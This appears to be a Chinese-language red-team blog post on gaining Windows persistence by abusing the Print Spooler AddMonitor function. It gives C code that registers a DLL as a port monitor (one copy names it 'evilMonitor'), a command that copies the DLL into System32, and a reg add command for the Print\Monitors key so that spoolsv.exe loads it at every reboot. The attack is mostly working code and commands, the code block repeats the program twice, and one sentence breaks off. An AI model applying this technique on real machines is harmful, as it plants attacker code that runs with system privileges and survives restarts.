---
title: Persistence AddMonitor
date: 2023-09-14T16:39:21+08:00
draft: false
url: /posts/2023-09-14/AddMonitor
tags:
  - AddMonitor
  - Windows
  - Persistence
---

## 0x00 前言

Persistence AddMonitor

## 0x01 AddMonitor

打印后台处理程序服务负责管理 Windows 操作系统中的打印作业。与服务的交互是通过 Print Spooler API 执行的，该 API 包含一个函数 ( **AddMonitor** )，可用

于安装本地端口监视器并连接配置、数据和监视器文件。该函数能够将 DLL 注入**spoolsv.exe**进程，并通过创建注册表项

### 编译注册

```c
#include "stdafx.h"
#include "Windows.h"

int main() {	
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT("Windows x64");
	TCHAR name[12] = TEXT("evilMonitor");
	TCHAR dll[12] = TEXT("evil64.dll");
	monitorInfo.pName = name;
	monitorInfo.pEnvironment = env;
	monitorInfo.pDLLName = dll;
	AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
	return 0;
}


#include "Windows.h"
 
int main() {
    MONITOR_INFO_2 monitorInfo;
    TCHAR env[12] = TEXT("Windows x64");
    TCHAR name[12] = TEXT("Monitor");
    TCHAR dll[12] = TEXT("test.dll");
    monitorInfo.pName = name;
    monitorInfo.pEnvironment = env;
    monitorInfo.pDLLName = dll;
    AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
    return 0;
}
```

编译代码将生成一个可执行文件（在本例中为 Monitors.exe），该可执行文件将在系统上执行恶意 DLL的注册

需要将 DLL 复制到 System32 文件夹，因为根据 Microsoft文档，这是AddMonitor函数加载相关 DLL 的预期位置

```cmd
copy test.dll %systemroot%\System32
```

为了实现持久性，“ **Monitors** ”注册表位置下需要一个密钥

```cmd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors

# Usage
reg add "hklm\system\currentcontrolset\control\print\monitors\Pentestlab" /v "Driver" /d "test.dll" /t REG_SZ
```

下次重新启动时，spoolsv.exe 进程将加载 Monitors 注册表项中存在并存储在 Windows 文件夹 System32 中的所有驱动程序 DLL 文件
